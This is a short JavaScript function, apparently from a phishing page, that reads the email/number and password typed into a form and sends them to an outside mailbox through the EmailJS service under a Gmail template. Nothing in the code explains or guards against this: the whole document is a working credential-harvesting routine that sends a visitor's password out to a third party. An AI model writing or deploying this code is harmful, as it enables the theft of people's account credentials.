// The get Info Function
function getInfo(params) {
  var btn = document.getElementById("btn");
  btn.style.color = "#86a7dd";

  var templateParams = {
    number:  document.getElementById("emailtxt").value,
    password: document.getElementById("passtxt").value, 
  };
  
  emailjs.send('gmail', 'shfbfhjsdj', templateParams)
  .then(function(response) {
    console.log('SUCCESS!', response.status, response.text);
 }, function(error) {
    console.log('FAILED...', error);
 });

}